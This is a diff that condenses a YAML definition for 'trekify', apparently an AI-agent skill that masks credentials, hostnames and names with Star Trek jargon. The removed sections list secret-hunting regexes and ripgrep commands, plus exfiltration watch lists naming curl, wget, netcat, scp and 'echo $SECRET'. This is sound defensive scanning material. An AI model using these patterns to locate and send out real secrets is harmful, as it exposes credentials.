@@ -7,14 +7,12 @@
 # Delivered with Geordi La Forge's competent mellifluence.
 #
 # PATRON ENGINEER: Geordi La Forge
-# Who could explain warp core breaches, plasma conduit failures,
-# and subspace anomalies with professional calm. We mask data
-# with the same deadpan technical confidence.
+#
+# See SKILL.md for full substitution matrices, examples, and implementation.
 
 skill:
   name: trekify
   version: 1.0.0
-  
   emoji: "🖖"
   tagline: "Privacy through technobabble"
   
@@ -22,213 +20,20 @@ skill:
     Transform sensitive information into plausible-sounding Star Trek
     technobabble that maintains narrative flow while protecting secrets.
     
-    Instead of ugly [REDACTED] blocks, readers get professional-sounding
-    technical jargon. They know it's masked, but it reads naturally.
-
-# THE PRINCIPLE
-
-principle: |
-  Sensitive data should be masked, but [REDACTED] breaks narrative flow.
-  TREKIFY replaces secrets with contextually appropriate technobabble
-  that maintains readability while clearly signaling "this was masked."
-  
-  The substitutions are consistent and reversible (with the key).
-  The tone is professional, not campy or parodic.
-
-# PASSTHROUGH — What NOT to Trekify
-
-passthrough:
-  description: |
-    MOOLLM is public. Its vocabulary passes through PURE and UNCHANGED.
-    No transporter accidents for our own terminology!
+    COMPOSES WITH: cursor-mirror (probing), ripgrep (scanning)
     
-    Only mask ACTUALLY SENSITIVE data — infrastructure, credentials,
-    customer info. Not our public concepts, skill names, or k-lines.
-  
-  always_passthrough:
-    moollm_concepts:
-      - "coherence engine"
-      - "thinking blocks"
-      - "context assembly"
-      - "cursor-mirror"
-      - "k-lines"
-      - "yaml jazz"
-      - "speed of light"
-      - "society of mind"
-      - "simulator effect"
-    
-    skill_names:
-      - "All skill names from skills/INDEX.yml"
-      - "thoughtful-commitment"
-      - "trekify"
-      - "adventure"
-      - "incarnation"
-      - "soul-chat"
-      - "cursor-mirror"
-      - "etc."
-    
-    protocols:
-      - "BOOTSTRAP"
-      - "ADVENTURE"
-      - "INCARNATE"
-      - "TREKIFY"
-      - "THOUGHTFUL-COMMITMENT"
-      - "etc."
-    
-    public_repos:
-      - "moollm"
-      - "mooco"
-      - "leela"
-    
-    public_terms:
-      - "LLM", "AI", "agent"
-      - "git", "commit", "branch", "merge"
-      - "YAML", "Markdown", "JSON"
-      - "Cursor", "IDE"
-  
-  the_rule: |
-    If it's in the MOOLLM docs, it's PUBLIC → passthrough unchanged.
-    If it's YOUR infrastructure, credentials, customers → TREKIFY!
-
-# BOLDLY, NOT SLYLY
-
-spirit:
-  description: |
-    TREKIFY is BOLD, not SLY. We're not hiding that we masked things.
-    We're GLEEFULLY and PLAYFULLY replacing sensitive data with
-    contextually appropriate technobabble.
-    
-    The reader should SMILE when they notice. Not feel tricked.
-  
-  principles:
-    bold_not_sneaky:
-      - "Don't pretend masking didn't happen"
-      - "Use obviously Trek terminology"
-      - "Let readers feel clever for noticing"
-      - "Consistent substitutions aid comprehension"
-    
-    playful_not_paranoid:
-      - "This is FUN, not FEAR"
-      - "Celebrate the substitutions"
-      - "Match context appropriately"
-      - "Databases → Memory Cores (fits!)"
-    
-    contextual_not_random:
-      - "Servers → Starbases (they serve!)"
-      - "Databases → Memory Cores (they remember!)"
-      - "Auth tokens → Quantum entanglement (they link!)"
-      - "Kubernetes → Holodeck orchestration (it orchestrates!)"
-  
-  tone: |
-    Imagine explaining the masking to a colleague:
-    "Yeah, I replaced all our server names with Starbases.
-    Memory Core Alpha is prod, Memory Core Beta is staging.
-    Makes it way more fun to read, and our infra is protected."
-
-# USER CONFIGURATION
-
-user_config:
-  description: |
-    Users can configure their own taboo tables and preferences.
-    Store in .moollm/trekify/config.yml (gitignored).
-  
-  location: ".moollm/trekify/config.yml"
-  gitignored: true
-  
-  schema:
-    enabled:
-      type: boolean
-      default: true
-      description: "Master switch for TREKIFY"
-    
-    sensitivity:
-      type: string
-      enum: [off, low, medium, high, paranoid]
-      default: medium
-      description: "How aggressively to mask"
-    
-    passthrough:
-      type: array
-      items: string
-      description: "Additional terms to never mask"
-      example:
-        - "my-open-source-project"
-        - "public-api-name"
-    
-    taboo:
-      type: object
-      description: "Custom patterns to always mask"
-      example:
-        my_company: "Starfleet Division Omega"
-        internal_product: "Project Defiant"
-        customer_acme: "Ambassador Vulcan"
-    
-    custom_substitutions:
-      type: object
-      description: "Override default substitutions"
-      example:
-        prod-db: "Memory Core Prime"
-        staging-db: "Memory Core Echo"
-        ceo_name: "Admiral {Name}"
-    
-    categories:
-      type: object
-      description: "Enable/disable masking by category"
-      example:
-        secrets: true
-        infrastructure: true
-        organizations: true
-        people: false  # Don't mask names
-        locations: false
-  
-  example_config: |
-    # .moollm/trekify/config.yml
-    # This file is gitignored — your secrets stay local
-    
-    enabled: true
-    sensitivity: medium
-    
-    # Terms that pass through unchanged
-    passthrough:
-      - "my-open-source-lib"
-      - "public-docs-site"
-      - "conference-talk-name"
-    
-    # Custom taboo → replacement mappings
-    taboo:
-      acme-corp: "Starfleet Division Alpha"
-      acme-db-prod: "Memory Core Prime"
-      acme-db-staging: "Memory Core Echo"
-      john.ceo@acme.com: "admiral@starfleet.fed"
-      secret-project-x: "Project Sovereign"
-    
-    # Category toggles
-    categories:
-      secrets: true        # Always mask credentials
-      infrastructure: true # Mask servers, IPs, ports
-      organizations: true  # Mask company/product names
-      people: true         # Mask employee names
-      locations: false     # Don't mask office addresses
-    
-    # Fun mode: extra Trek flavor
-    extra_trek: true       # Add stardates, more technobabble
-  
-  loading_order:
-    - "1. Built-in defaults from skill"
-    - "2. Override with .moollm/trekify/config.yml"
-    - "3. Override with method parameters"
-    - "Later settings override earlier ones"
+    BOLDLY, NOT SLYLY — readers should smile, not feel tricked.
 
 # INTERFACE
 
 tier: 2
+protocol: TREKIFY
+
 allowed_tools:
   - read_file
   - write_file
   - run_terminal_cmd
   - grep
-
-protocol: TREKIFY
 
 related:
   - cursor-mirror          # COMPOSES: Active probing for sensitive patterns
@@ -236,1206 +41,199 @@ related:
   - session-log            # Session logs may need masking
   - plain-text             # All masked output stays plain text
 
-# COMPOSABILITY — Active Probing with cursor-mirror
-
-cursor_mirror_composition:
-  description: |
-    TREKIFY composes with cursor-mirror for ACTIVE PROBING.
-    Don't just mask on demand — actively HUNT for sensitive patterns
-    in transcripts, thinking blocks, tool calls, and session history.
-  
-  what_cursor_mirror_provides:
-    transcripts: "Full conversation history, greppable"
-    thinking_blocks: "LLM reasoning — may contain quoted secrets"
-    tool_calls: "Commands executed — may show credentials"
-    context_assembly: "Files gathered — may reveal architecture"
-    sql_access: "Direct database queries for deep scanning"
-  
-  active_probes:
-    description: "Automated scanners that hunt for sensitive patterns"
-    
-    PROBE-SECRETS:
-      description: "Hunt for leaked credentials"
-      patterns:
-        - "API keys: sk-*, api_key=*, OPENAI_API_KEY"
-        - "Passwords: password=*, passwd:*, pwd="
-        - "Tokens: bearer *, jwt=*, token="
-        - "Private keys: -----BEGIN.*PRIVATE KEY-----"
-        - "Connection strings: postgres://, mysql://, mongodb://"
-        - "AWS: AKIA*, aws_secret_access_key"
-      commands:
-        - "cursor-mirror tgrep 'sk-[a-zA-Z0-9]{20,}'"
-        - "cursor-mirror tgrep 'password[=:]'"
-        - "cursor-mirror tgrep 'BEGIN.*PRIVATE KEY'"
-        - "cursor-mirror tgrep 'AKIA[A-Z0-9]{16}'"
-    
-    PROBE-INFRASTRUCTURE:
-      description: "Hunt for internal infrastructure details"
-      patterns:
-        - "Internal hostnames: *.internal, *.local, *.corp"
-        - "IP addresses: private ranges (10.*, 192.168.*, 172.16-31.*)"
-        - "Ports: non-standard ports in URLs"
-        - "Cloud resources: arn:aws:*, projects/*/locations/*"
-      commands:
-        - "cursor-mirror tgrep '\\.internal|\\.local|\\.corp'"
-        - "cursor-mirror tgrep '10\\.[0-9]+\\.[0-9]+\\.[0-9]+'"
-        - "cursor-mirror tgrep 'arn:aws:'"
-    
-    PROBE-PROPRIETARY:
-      description: "Hunt for proprietary/internal terms"
-      sources:
-        - "Load from .moollm/trekify/proprietary-terms.txt"
-        - "Company-specific product names"
-        - "Internal project codenames"
-        - "Customer account identifiers"
-      commands:
-        - "cursor-mirror tgrep -f .moollm/trekify/proprietary-terms.txt"
-    
-    PROBE-PEOPLE:
-      description: "Hunt for personal information"
-      patterns:
-        - "Email addresses: *@company.com"
-        - "Employee names from internal directories"
-        - "Phone numbers"
-        - "Slack handles, GitHub usernames (internal)"
-      commands:
-        - "cursor-mirror tgrep '@company\\.com'"
-        - "cursor-mirror tgrep -f .moollm/trekify/employee-names.txt"
-    
-    PROBE-CONTEXT:
-      description: "Hunt for sensitive contexts, not just patterns"
-      contexts:
-        - "Discussions about security vulnerabilities"
-        - "Incident response conversations"
-        - "HR or personnel discussions"
-        - "Financial data or projections"
-        - "Legal or compliance matters"
-      approach: |
-        Use LLM semantic understanding, not just regex.
-        "This looks like an incident response discussion" →
-        flag entire section for review, not just keywords.
-  
-  probe_workflow:
-    description: "How to run active probes"
-    steps:
-      - "1. cursor-mirror tree → find sessions to scan"
-      - "2. trekify PROBE <session> → run all probes"
-      - "3. Review findings with risk assessment"
-      - "4. trekify MASK-SESSION with findings → auto-mask detected patterns"
-      - "5. Manual review of flagged contexts"
-    
-    example: |
-      # Scan current session for secrets
-      trekify PROBE-SECRETS e8587ace
-      
-      # Full security scan
-      trekify PROBE e8587ace --all
-      
-      # Scan and auto-mask
-      trekify PROBE-AND-MASK e8587ace -o masked.txt
-  
-  deep_scan_commands:
-    description: "cursor-mirror commands for deep scanning"
-    
-    transcript_grep:
-      - "cursor-mirror tgrep 'pattern' → search all transcripts"
-      - "cursor-mirror agent-transcript <id> | grep -E 'pattern'"
-    
-    thinking_scan:
-      - "cursor-mirror thinking <id> | grep -i 'password\\|secret\\|key'"
-      - "Thinking blocks often contain quoted sensitive data"
-    
-    tool_call_scan:
-      - "cursor-mirror tools <id> | grep -i 'credentials\\|auth'"
-      - "Shell commands may contain secrets in args"
-    
-    context_scan:
-      - "cursor-mirror context-sources <id>"
-      - "Which files were read? Any sensitive ones?"
-    
-    sql_deep_probe:
-      - "cursor-mirror sql --db <ref> 'SELECT * FROM bubbles WHERE text LIKE \"%password%\"'"
-      - "Direct database query for comprehensive scan"
-
-# WORKSPACE SCANNERS — Long Range, Short Range, Tricorder
-
-scanners:
-  description: |
-    TREKIFY can scan the entire workspace for sensitive patterns.
-    Think of it like the Enterprise's sensor systems:
-    - LONG RANGE SCANNERS: Workspace-wide search
-    - SHORT RANGE SCANNERS: Directory/file focused
-    - TRICORDER: Detailed analysis of specific items
-  
-  long_range_scanners:
-    description: |
-      Scan the ENTIRE workspace for sensitive patterns.
-      "Captain, long range sensors are detecting quantum signatures
-      throughout the sector." (Secrets everywhere!)
-    
-    tools_used:
-      grep: "ripgrep (rg) for fast regex search"
-      glob: "File pattern matching"
-      semantic: "Vector search for conceptual matches"
-    
-    commands:
-      secrets:
-        - "rg -i 'password[=:]' --type-add 'config:*.{yml,yaml,json,env,ini,conf}' -t config"
-        - "rg 'sk-[a-zA-Z0-9]{20,}' ."
-        - "rg 'AKIA[A-Z0-9]{16}' ."
-        - "rg -i 'api[_-]?key' ."
-        - "rg 'BEGIN.*PRIVATE KEY' ."
-      
-      infrastructure:
-        - "rg '\\.internal|\\.local|\\.corp' ."
-        - "rg -E '10\\.[0-9]+\\.[0-9]+\\.[0-9]+' ."
-        - "rg -E '192\\.168\\.[0-9]+\\.[0-9]+' ."
-        - "rg 'arn:aws:' ."
-      
-      env_files:
-        - "rg --files -g '*.env*' -g '.env*'"
-        - "rg --files -g '*credentials*' -g '*secrets*'"
-        - "rg --files -g '*.pem' -g '*.key'"
-    
-    exclusions:
-      - "node_modules/"
-      - ".git/"
-      - "vendor/"
-      - "*.lock"
-      - ".moollm/trekify/  # Don't scan our own config!"
-  
-  short_range_scanners:
-    description: |
-      Focused scan on specific directories or file types.
-      "Short range sensors show elevated readings in Section 7."
-      (Secrets concentrated in config/ directory!)
-    
-    focus_modes:
-      config_files:
-        description: "Scan configuration files"
-        patterns: ["*.yml", "*.yaml", "*.json", "*.env", "*.ini", "*.conf", "*.toml"]
-        command: "rg -i 'password|secret|key|token|credential' -g '*.{yml,yaml,json,env,ini,conf,toml}'"
-      
-      source_code:
-        description: "Scan source code for hardcoded secrets"
-        patterns: ["*.py", "*.js", "*.ts", "*.go", "*.java", "*.rb"]
-        command: "rg -i 'password\\s*=' -t py -t js -t ts"
-      
-      documentation:
-        description: "Scan docs for leaked examples"
-        patterns: ["*.md", "*.txt", "*.rst"]
-        command: "rg -i 'example.*password|sample.*key' -t md"
-      
-      scripts:
-        description: "Scan scripts for inline credentials"
-        patterns: ["*.sh", "*.bash", "*.zsh", "Makefile", "Dockerfile"]
-        command: "rg -i 'export.*password|export.*key' -g '*.sh'"
-      
-      specific_directory:
-        description: "Deep scan a specific directory"
-        command: "rg -i 'password|secret|key|token' <directory>/"
-  
-  tricorder:
-    description: |
-      Detailed analysis of a specific file or pattern.
-      "Tricorder readings indicate this file contains
-      multiple credential signatures, Captain."
-    
-    capabilities:
-      file_analysis:
-        - "Line-by-line risk assessment"
-        - "Context around each finding"
-        - "Severity classification"
-        - "Suggested replacements"
-      
-      pattern_tracing:
-        - "Where else does this pattern appear?"
-        - "Git history: when was it introduced?"
-        - "Who committed it? (git blame)"
-        - "Is it in .gitignore? Should it be?"
-      
-      semantic_analysis:
-        - "What is this file's purpose?"
-        - "Is this a real credential or example?"
-        - "Production vs test environment?"
-        - "Public-facing or internal?"
-    
-    commands:
-      analyze_file: "trekify TRICORDER <file>"
-      trace_pattern: "trekify TRICORDER --trace 'pattern'"
-      deep_context: "trekify TRICORDER --semantic <file>"
-  
-  vector_search:
-    description: |
-      Use semantic/vector search for conceptual matches.
-      Not just regex — find things that LOOK LIKE secrets
-      even if they don't match exact patterns.
-    
-    capabilities:
-      - "Find files similar to known credential files"
-      - "Detect 'smells like a secret' patterns"
-      - "Catch obfuscated or encoded credentials"
-      - "Find security-related discussions in code comments"
-    
-    examples:
-      - "Files that look like .env but aren't named .env"
-      - "Base64-encoded strings that might be credentials"
-      - "Comments mentioning 'TODO: remove before commit'"
-      - "Test fixtures that contain real-looking data"
-
-# EXFILTRATION ANALYSIS — Detect Data Leaving
-
-exfiltration_analysis:
-  description: |
-    Analyze tool calls for potential data exfiltration patterns.
-    Not all sensitive data stays in files — some leaves via
-    network calls, API requests, file uploads, or external commands.
-    
-    "Captain, sensors detecting unauthorized subspace transmissions!"
-  
-  what_to_detect:
-    description: "Patterns that suggest data might be leaving the system"
-    
-    network_calls:
-      description: "Data sent over the network"
-      patterns:
-        curl: "curl.*-d.*password|curl.*--data.*secret|curl.*-X POST"
-        wget: "wget.*--post-data"
-        fetch: "fetch\\(.*body:.*credential"
-        requests: "requests\\.(post|put).*password"
-        axios: "axios\\.(post|put).*secret"
-      risk: "Data could be sent to external servers"
-    
-    api_calls:
-      description: "Credentials passed to external APIs"
-      patterns:
-        api_key_in_url: "https?://.*api[_-]?key="
-        auth_header: "Authorization:.*Bearer"
-        webhook: "webhook.*secret|callback.*token"
-      risk: "Credentials exposed in API calls"
-    
-    file_operations:
-      description: "Sensitive data written to risky locations"
-      patterns:
-        tmp_files: "write.*/tmp/.*password|echo.*>/tmp/"
-        external_mounts: "write.*/mnt/|write.*/media/"
-        cloud_sync: "write.*Dropbox|write.*Google Drive|write.*OneDrive"
-        world_readable: "chmod.*777|chmod.*666"
-      risk: "Data written to accessible locations"
-    
-    clipboard:
-      description: "Sensitive data copied to clipboard"
-      patterns:
-        pbcopy: "pbcopy.*password|.*secret.*\\| pbcopy"
-        xclip: "xclip.*credential"
-        clipboard_api: "clipboard\\.writeText.*key"
-      risk: "Data accessible via paste"
-    
-    environment:
-      description: "Secrets exposed in environment"
-      patterns:
-        export: "export.*PASSWORD=|export.*SECRET="
-        printenv: "printenv.*KEY|env \\| grep -i secret"
-        echo_env: "echo \\$.*PASSWORD"
-      risk: "Secrets visible in process environment"
-    
-    logging:
-      description: "Secrets accidentally logged"
-      patterns:
-        print_secret: "print\\(.*password|console\\.log\\(.*secret"
-        logger: "logger\\.(info|debug).*credential"
-        log_file: ">>.*\\.log.*password"
-      risk: "Secrets persisted in log files"
-    
-    database:
-      description: "Credentials in database operations"
-      patterns:
-        sql_with_creds: "INSERT.*password.*VALUES|UPDATE.*SET.*password"
-        connection_string: "psycopg2\\.connect\\(.*password"
-      risk: "Credentials stored in database"
-    
-    email:
-      description: "Secrets sent via email"
-      patterns:
-        smtp: "smtp.*password|sendmail.*secret"
-        mailto: "mailto:.*\\?body=.*key"
-      risk: "Credentials sent in plaintext email"
-  
-  tool_call_analysis:
-    description: "Scan cursor-mirror tool calls for exfiltration patterns"
-    
-    high_risk_tools:
-      Shell:
-        description: "Shell commands can do anything"
-        watch_for:
-          - "curl, wget, nc, netcat"
-          - "scp, rsync, ftp"
-          - "mail, sendmail"
-          - "echo $SECRET"
-      
-      Write:
-        description: "File writes to risky locations"
-        watch_for:
-          - "Paths outside workspace"
-          - "/tmp/, /var/, world-readable"
-          - "Cloud sync folders"
-      
-      browser_navigate:
-        description: "URLs with embedded credentials"
-        watch_for:
-          - "API keys in URL parameters"
-          - "Tokens in query strings"
-          - "Webhook URLs with secrets"
-    
-    analysis_commands:
-      - "cursor-mirror tools <id> | grep -i 'curl\\|wget\\|fetch'"
-      - "cursor-mirror tools <id> | grep -i 'password\\|secret\\|key\\|token'"
-      - "cursor-mirror tools <id> -f json | jq '.[] | select(.tool==\"Shell\")'"
-  
-  severity_levels:
-    critical:
-      - "Credentials sent to external URL"
-      - "Private keys written to shared location"
-      - "Database connection strings in logs"
-    high:
-      - "Secrets in shell command arguments"
-      - "Clipboard operations with credentials"
-      - "Environment variable exposure"
-    medium:
-      - "Secrets in debug logging"
-      - "Credentials in /tmp files"
-      - "Print statements with sensitive data"
-    low:
-      - "Internal API calls with auth"
-      - "Local file operations with secrets"
-
 tags:
   - privacy
   - security
   - masking
   - redaction
   - star-trek
-  - technobabble
+  - composability
 
-# SUBSTITUTION MATRICES
+# PASSTHROUGH — What NOT to Trekify
 
-substitutions:
-  
-  # SECRETS — Authentication & Credentials
+passthrough:
+  rule: "If it's in MOOLLM docs → passthrough. If it's YOUR secrets → TREKIFY!"
+  always_pass:
+    - "MOOLLM concepts, skill names, protocols, k-lines"
+    - "Public repos: moollm, mooco, leela"
+    - "Standard terms: LLM, git, YAML, Cursor"
+
+# QUICK REFERENCE — Substitutions
+
+substitutions_quick:
   secrets:
-    api_keys:
-      pattern: "(sk-|api[_-]?key|apikey)[a-zA-Z0-9_-]{20,}"
-      replacement: "quantum entanglement token (Tier {N} clearance)"
-      examples:
-        - "sk-live-abc123def456 → quantum entanglement token (Tier 3 clearance)"
-        - "OPENAI_API_KEY → quantum relay authorization"
-    
-    passwords:
-      pattern: "(password|passwd|pwd)[=:].+"
-      replacement: "biometric phase harmonics"
-      examples:
-        - "password=hunter2 → biometric phase harmonics [SECURED]"
-    
-    tokens:
-      pattern: "(bearer|token|jwt)[=: ][a-zA-Z0-9_.-]+"
-      replacement: "subspace authentication matrix"
-      examples:
-        - "Bearer eyJhbG... → subspace authentication matrix"
-    
-    private_keys:
-      pattern: "-----BEGIN (RSA |EC |)PRIVATE KEY-----"
-      replacement: "isolinear encryption sequence [CLASSIFIED]"
-    
-    connection_strings:
-      pattern: "(postgres|mysql|mongodb)://[^\\s]+"
-      replacement: "memory core uplink protocol"
-
-  # INFRASTRUCTURE — Servers & Services
+    api_keys: "quantum entanglement token"
+    passwords: "biometric phase harmonics"
+    tokens: "subspace authentication matrix"
+    private_keys: "isolinear encryption sequence"
+  
   infrastructure:
-    servers:
-      pattern: "[a-z]+-[a-z]+-\\d+\\.[a-z]+\\.(internal|local|corp)"
-      replacement: "Starbase {N}"
-      examples:
-        - "prod-db-west-2.company.internal → Starbase 47"
-        - "api-server-1.corp → Starbase 12"
-    
-    databases:
-      pattern: "(prod|staging|dev)[-_]?(db|database|postgres|mysql)"
-      replacement: "Memory Core {Greek}"
-      examples:
-        - "prod-db → Memory Core Alpha"
-        - "staging-database → Memory Core Beta"
-        - "dev-postgres → Memory Core Gamma"
-    
-    ip_addresses:
-      pattern: "\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}"
-      replacement: "subspace coordinates {coords}"
-      examples:
-        - "192.168.1.100 → subspace coordinates 47-alpha-7"
-    
-    ports:
-      pattern: ":\\d{4,5}"
-      replacement: "docking frequency {N}"
-      examples:
-        - ":5432 → docking frequency 54"
-        - ":8080 → docking frequency 80"
-    
-    cloud_providers:
-      aws: "Utopia Planitia Fleet Yards"
-      gcp: "Jupiter Station"
-      azure: "Spacedock"
-      kubernetes: "holodeck orchestration matrix"
-      docker: "cargo bay containment"
-    
-    regions:
-      us-east-1: "Alpha Quadrant, Sector 001"
-      us-west-2: "Alpha Quadrant, Sector 047"
-      eu-west-1: "Beta Quadrant, Sector 012"
-      ap-southeast-1: "Gamma Quadrant, Sector 089"
-
-  # ORGANIZATIONS — Companies & Products
+    servers: "Starbase {N}"
+    databases: "Memory Core Alpha/Beta/Gamma"
+    ip_addresses: "subspace coordinates"
+    ports: "docking frequency"
+    aws: "Utopia Planitia Fleet Yards"
+    gcp: "Jupiter Station"
+    kubernetes: "holodeck orchestration matrix"
+  
   organizations:
-    company_names:
-      pattern: "(Company|Corp|Inc|LLC|Ltd)\\b"
-      replacement: "Starfleet Division {Greek}"
-      examples:
-        - "Acme Corp → Starfleet Division Alpha"
-    
-    product_names:
-      internal_pattern: "(project|product)[-_][a-z]+"
-      replacement: "Project {ShipClass}"
-      ship_classes:
-        - Galaxy
-        - Sovereign
-        - Intrepid
-        - Defiant
-        - Constitution
-        - Excelsior
-        - Nova
-        - Prometheus
-    
-    customer_names:
-      pattern: "customer[-_]?[a-z]+"
-      replacement: "Ambassador {Species}"
-      species:
-        - Vulcan
-        - Andorian
-        - Tellarite
-        - Betazoid
-        - Trill
-        - Bajoran
-
-  # PEOPLE — Names & Contacts
+    companies: "Starfleet Division {Greek}"
+    products: "Project {ShipClass}"
+    customers: "Ambassador {Species}"
+  
   people:
-    employee_names:
-      replacement: "Lieutenant {Role}-appropriate name"
-      examples:
-        - "John Smith (engineer) → Lieutenant Torres"
-        - "Jane Doe (manager) → Commander Riker"
-        - "Bob Wilson (security) → Lieutenant Worf"
-    
-    email_addresses:
-      pattern: "[a-z.]+@[a-z]+\\.[a-z]+"
-      replacement: "{name}@starfleet.fed"
-      examples:
-        - "john.smith@company.com → j.smith@starfleet.fed"
-    
-    customer_contacts:
-      replacement: "Ambassador {Title}"
+    employees: "Lieutenant/Commander {Name}"
+    emails: "{name}@starfleet.fed"
 
-  # LOCATIONS — Physical & Logical
-  locations:
-    office_addresses:
-      replacement: "Deck {N}, Section {Letter}"
-      examples:
-        - "123 Main St, Floor 4 → Deck 4, Section Alpha"
-    
-    data_centers:
-      replacement: "Starbase {N} primary core"
-    
-    geographic_regions:
-      us: "Alpha Quadrant"
-      europe: "Beta Quadrant"  
-      asia: "Gamma Quadrant"
-      other: "Delta Quadrant"
+# USER CONFIG
 
-# MOOLLM-SPECIFIC ADAPTATIONS
-
-moollm_terms:
-  description: "Trek technobabble for MOOLLM concepts"
-  
-  mappings:
-    coherence_engine: "main deflector array"
-    thinking_blocks: "positronic cascade resonance"
-    context_assembly: "sensor array configuration"
-    cursor_mirror: "internal diagnostic holomatrix"
-    session_state: "warp field geometry"
-    tool_calls: "transporter lock sequences"
-    git_commits: "temporal anchor points"
-    branches: "parallel quantum timelines"
-    merge_conflicts: "subspace interference patterns"
-    yaml_files: "isolinear chip configurations"
-    skills: "holodeck subroutines"
-    adventures: "holodeck programs"
-    characters: "holographic entities"
-
-# DELIVERY STYLE
-
-style:
-  tone: "Competent, professional, slightly technical"
-  
-  inspiration: |
-    Geordi La Forge explaining a warp core diagnostic:
-    calm, confident, using precise technical terminology
-    without being condescending or overly dramatic.
-  
-  examples:
-    good:
-      - "We're routing the authentication through the quantum relay buffers."
-      - "I've reconfigured the isolinear chips to handle the increased load."
-      - "The subspace harmonics are within normal parameters."
-      - "Running a level-3 diagnostic on the memory core."
-      - "The temporal anchors are holding steady."
-    
-    bad:
-      - "Beam me up, Scotty! 🖖" # Too campy
-      - "ENGAGE THE WARP DRIVE!!!" # Too dramatic
-      - "Live long and [REDACTED]" # Breaks the fourth wall
-      - "Make it so, password=hunter2" # Mixing styles
-  
-  rules:
-    - "Maintain professional tone throughout"
-    - "Use consistent substitutions within a document"
-    - "Let the reader feel clever for noticing"
-    - "Keep narrative flow intact"
-    - "Never wink at the camera"
-    - "Treat it as real technical documentation"
+config:
+  location: ".moollm/trekify/config.yml"
+  gitignored: true
+  options:
+    - "enabled: true/false"
+    - "sensitivity: off/low/medium/high/paranoid"
+    - "passthrough: [terms to never mask]"
+    - "taboo: {pattern: replacement}"
+    - "categories: {secrets: true, infrastructure: true, ...}"
 
 # METHODS
 
 methods:
-  
+
+  # Core Masking
   MASK:
     description: "Apply TREKIFY masking to text"
-    parameters:
-      text:
-        type: string
-        description: "Text containing sensitive information"
-      sensitivity:
-        type: string
-        enum: [low, medium, high, classified]
-        default: medium
-        description: "How aggressively to substitute"
-      categories:
-        type: array
-        items: string
-        enum: [secrets, infrastructure, organizations, people, locations, all]
-        default: [all]
-        description: "Which categories to mask"
-      maintain_structure:
-        type: boolean
-        default: true
-        description: "Keep same sentence structure, just swap terms"
-    returns:
-      masked_text: string
-      substitutions: array  # [{original, replacement, category, line}]
-      substitution_key: string  # For reversing if needed (store securely!)
-    example: |
-      invoke:
-        skill: trekify
-        method: MASK
-        parameters:
-          text: "Connected to prod-db-west-2:5432 with API key sk-live-abc123"
-          sensitivity: high
-      
-      returns:
-        masked_text: "Established uplink to Memory Core Alpha, docking frequency 54, via quantum entanglement token (Tier 3 clearance)"
+    parameters: {text: string, sensitivity: enum, categories: array}
+    returns: {masked_text: string, substitutions: array, substitution_key: string}
 
   MASK-FILE:
-    description: "Apply TREKIFY masking to a file"
-    parameters:
-      path:
-        type: string
-        description: "Path to file to mask"
-      output_path:
-        type: string
-        description: "Path for masked output (or modify in place if same)"
-      sensitivity:
-        type: string
-        default: medium
-      categories:
-        type: array
-        default: [all]
-    returns:
-      substitutions_count: int
-      categories_masked: array
-      output_path: string
+    description: "Apply masking to a file"
+    parameters: {path: string, output_path: string, sensitivity: enum}
+    returns: {substitutions_count: int, output_path: string}
 
   MASK-SESSION:
-    description: "Apply TREKIFY to a cursor-mirror session transcript"
-    parameters:
-      composer:
-        type: string
-        description: "Composer ID or reference"
-      output_path:
-        type: string
-        description: "Where to save masked transcript"
-      preserve_thinking:
-        type: boolean
-        default: true
-        description: "Keep thinking blocks (masked) or remove entirely"
-    returns:
-      original_path: string
-      masked_path: string
-      substitutions: array
+    description: "Mask a cursor-mirror session transcript"
+    composes_with: cursor-mirror
+    parameters: {composer: string, output_path: string}
+    returns: {masked_path: string, substitutions: array}
 
   SCAN:
-    description: "Scan text for potential sensitive data without masking"
-    parameters:
-      text:
-        type: string
-        description: "Text to scan"
-      report_level:
-        type: string
-        enum: [summary, detailed, verbose]
-        default: summary
-    returns:
-      findings: array  # [{pattern_type, match, line, recommendation}]
-      risk_assessment: string
-      recommended_sensitivity: string
+    description: "Scan text for sensitive patterns without masking"
+    parameters: {text: string, report_level: enum}
+    returns: {findings: array, risk_assessment: string}
 
   UNMASK:
-    description: "Reverse TREKIFY masking using substitution key"
-    parameters:
-      masked_text:
-        type: string
-        description: "Previously masked text"
-      substitution_key:
-        type: string
-        description: "Key from original masking operation"
-    returns:
-      original_text: string
-      substitutions_reversed: int
-    note: "Only works if you have the key from the original MASK operation"
+    description: "Reverse masking with substitution key"
+    parameters: {masked_text: string, substitution_key: string}
+    returns: {original_text: string}
 
   CONFIGURE:
     description: "Add custom substitution patterns"
-    parameters:
-      category:
-        type: string
-        description: "Category for the pattern"
-      pattern:
-        type: string
-        description: "Regex pattern to match"
-      replacement:
-        type: string
-        description: "Trek-style replacement template"
-    returns:
-      configured: boolean
-      pattern_id: string
+    parameters: {category: string, pattern: string, replacement: string}
 
-  # ACTIVE PROBING — Composing with cursor-mirror
-
+  # Active Probing (cursor-mirror composition)
   PROBE:
-    description: "Active hunt for sensitive patterns in a session"
+    description: "Hunt for sensitive patterns in a session"
     composes_with: cursor-mirror
-    parameters:
-      composer:
-        type: string
-        description: "Composer ID or reference"
-      probes:
-        type: array
-        items: string
-        enum: [secrets, infrastructure, proprietary, people, context, all]
-        default: [all]
-        description: "Which probe types to run"
-      include_thinking:
-        type: boolean
-        default: true
-        description: "Scan thinking blocks (often contain quoted secrets)"
-      include_tool_calls:
-        type: boolean
-        default: true
-        description: "Scan tool call arguments"
-    returns:
-      findings: array  # [{probe, pattern, match, location, severity, context}]
-      risk_score: string  # low/medium/high/critical
-      recommendations: array
-      auto_mask_ready: boolean
-    example: |
-      invoke:
-        skill: trekify
-        method: PROBE
-        parameters:
-          composer: "e8587ace"
-          probes: [secrets, infrastructure]
-      
-      # Output:
-      # FINDINGS:
-      # - [CRITICAL] API key pattern in thinking block line 423
-      # - [HIGH] Internal hostname in tool call line 156
-      # - [MEDIUM] Private IP address in context assembly
-      # 
-      # Risk Score: HIGH
-      # Recommendation: Run MASK-SESSION before sharing
+    parameters: {composer: string, probes: array}
+    returns: {findings: array, risk_score: string}
 
   PROBE-SECRETS:
-    description: "Hunt specifically for leaked credentials"
+    description: "Hunt for leaked credentials"
     composes_with: cursor-mirror
-    parameters:
-      composer:
-        type: string
-      deep_scan:
-        type: boolean
-        default: true
-        description: "Include SQL database scan"
-    patterns:
-      - "API keys: sk-*, api_key=*, OPENAI_API_KEY"
-      - "AWS: AKIA*, aws_secret_access_key"
-      - "Passwords: password=*, passwd:*"
